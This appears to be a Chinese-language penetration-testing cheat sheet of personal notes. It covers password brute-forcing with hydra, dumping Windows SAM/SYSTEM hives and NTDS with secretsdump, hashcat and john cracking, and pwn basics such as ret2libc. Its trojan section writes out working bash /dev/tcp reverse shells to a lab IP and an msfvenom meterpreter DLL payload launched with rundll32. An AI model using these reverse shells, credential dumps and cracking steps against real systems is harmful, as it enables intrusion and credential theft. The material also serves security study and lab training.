# Credential_Binary

[TOC]

## Credential

#### 密码破解

###### hydra

```
-l -L -p -P   单个用户名，用户名字典，单个密码，密码字典

-t 并行连接数 -o 将结果输出到文件

hydra -L 用户名字典 -P 密码字典 IP ssh

\#ssh可替换为其他服务

ip ssh 或 ssh://  两种格式

http一般用burp等图形化工具
```

#### 密码导出

###### impacket-secretsdump

```
reg save hklm\sam sam.hive

reg save hklm\system system.hive

reg save hklm\security security.hive

ntds.dit导出

impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL #离线

impacket-secretsdump two/win2019:root@192.168.12.5 #在线
```

#### 密码生成

###### cupp

```
cupp -i

\#社工密码字典生成工具

cupp -w file.txt   从文件中生成
```

###### cewl

```
-d 深度 默认2

-m  单词最小长度 默认3

-w 将结果写入文件

-a 同时爬取元数据（作者，描述等）

-c 统计每个单词出现的次数

--with-numbers 允许生成的单词中包好数字

-v 详细模式

cewl http://www.baidu.com/

\#爬虫字典生成
```

###### crunch

```
crunch 1 1 -p i love you

\#i love you 随机排列组合

crunch 7 7 -t admin%%

\#生成7位 admin数字数字的组合

crunch 2 4 "ion;aiosdnp=324;+:+_"         后面括起来的是字符集，生成包含字符集的2-4位

crunch 2 2 -t d@ -p w o  生成2位密码，d替换w或者o

-t 按指定格式

d 原本字符匹配(-p)

^ 符号

% 数字

, 大写字母

@ 小写字母

hashcat --stdout dict -r best66.rule > dict.best66  #规则生成字典
```

#### hash破解

###### hashcat

```
sudo hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt --potfile-disable

hashcat -a 3 -m 1800 6.hash ?l?l?u?d

hashcat -m xx -a xx [hash_file] [dict_path]

--identify 判断hash类型

-a 0 字典攻击

-a 3 掩码攻击

-a 6 / -a 7 字典+掩码组合攻击 / 掩码+字典组合攻击

-m 指定hash类型

--potfile-disable 不记录

--show 显示已经破解的hash

掩码攻击(可通过查看man文档)

?l - 小写字母 (a-z)

?u - 大写字母 (A-Z)

?d - 数字 (0-9)

?s - 特殊字符 (!@#$%^&*()等)

?a - 所有可打印字符（包括空格）

?b - 0x00-0xff（二进制）

hashcat -a6 哈希文件 字典文件 ?d?d?d?d

这会在每个字典单词后面尝试4位数字。

或者，掩码+字典（在掩码后面添加字典单词）：

hashcat -a7 哈希文件 ?d?d?d?d 字典文件
```

###### john

```
john word.hash [--wordlist=/usr/share/wordlists/rockyou.txt] --pot=drvier.pot

--wordlist=xx1,xx2 字典模式 (多字典文件)

--mask='?l?l?l?l?d?d?d?d' 掩码模式

--rules file.rule 规则

--format=raw-md5  指定哈希格式

--format=auto 自动检测格式

--show 显示破解结果

--pot=1.pot            将记录文件记录为1.pot(默认是原hash文件)

locate -i *2john

rar2john 1.rar > 1.rar.hash #破解rar加密的密钥
```

#### hash识别

###### hash-identifier

```
hash-identifier hash
```

###### hashcat

```
hashcat --identify hash.hash
```

###### hashid

```
hashid -jm hash.hash    -j -m 识别并指出hash在john和hashcat中的编号和格式
```

###### nth

```
nth -t '$5$TOHC28EqgzhS9EWg$M.EzKtwKRuqgj3jVtzT53EGd8kwgqrjcbnBUUEMgIU.'
```

###### hash-analyzer.com

```
www.tunnelsup.com/hash-analyzer
```

###### cmd5.com

```
cmd5.com
```

#### hash生成

###### openssl

```
echo '123123' | openssl md5

openssl passwd -6 123
```

###### mkpasswd

```
mkpasswd -m sha512crypt 123

mkpasswd -m sha512crypt -S '12345678' '123' #-S 加盐
```

#### ssh公钥私钥

###### ssh-keygen

```
ssh-keygen

cp id_rsa.pub ~/.ssh/authorized_keys

ssh -i id_rsa root@xxx.xxx.xxx.xxx
```

#### gpg解密

```
gpg --import privkey.gpg  #导入密钥

gpg -d backup_sshykey.pgp -o xxx.key   #解密保存私钥到key

gpg --list-keys #查看导入私钥

gpg --delete-secret-keys "xx@xxxx" #删除导入私钥

rm -rf ~/.gnupg #删除密钥存储位置
```

## Binary

#### exp

searchsploit 

exploit-db

google

seebug

BugTraq

github

metasploit search suggester

\#example:

bash version

sudo -s | grep version

------

#### 逆向和pwn

###### 汇编

mov eax，5

mov ebx，12

mul/imul ebx

mov edx，0

mov eax, 7

mov ebx,2

div ebx

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1278.jpg)



函数返回值存储在eax中

mingw32

x86_64-w64-mingw32-gcc hello.c -o hello.exe # 64位程序

i686-w64-mingw32-gcc hello.c -o hello.exe # 32位程序

gcc -S test.c -o test.s

gcc -c test.s -o test.o

gcc test.o -o test.elf



![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1272.jpg)



ret2libc

readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E '(exit|system)@@'

strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -E /bin/sh

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1274.jpg)

dmesg | tail

readelf -W -l

格式化字符串绕过canary

ret2libc 绕过 dep/nx aslr关闭

rop绕过 dep/nx和aslr

逆向和pwn工具

https://down.52pojie.cn/

缓冲区溢出字节漏洞

msf-pattern_create -l 50

二进制逆向

readelf -W -l 

checksec

file

strings

xxd

ldd #查看本地动态连接库情况

nm #查看符号表

binwalk #捆绑文件

strace 系统调用定位

cat /proc/sys/kernel/randomize_va_space

静态分析

ghidra 

ida

------

动态调试

OllyDbg

x64dbg

immunityDebugger

CheatEngine

windbg

SysinternalsSuite

API_monitor

GDB

GDB-peda

binutil

valgrind

#### 木马

find . -exec /bin/bash -c -p "/bin/bash -p -i >& /dev/tcp/192.168.136.128/666 0>&1" {} \;

/bin/bash -c -p "/bin/bash -p -i >& /dev/tcp/192.168.136.128/666 0>&1"

dll

msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.10.129 Lport=6767 -f dll -o c.dll

rundll32 .\c.dll,DllMain

vbs

msi

exe

elf

sfx.exe #自解压压缩包

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224704_1276.jpg)

ahmyth

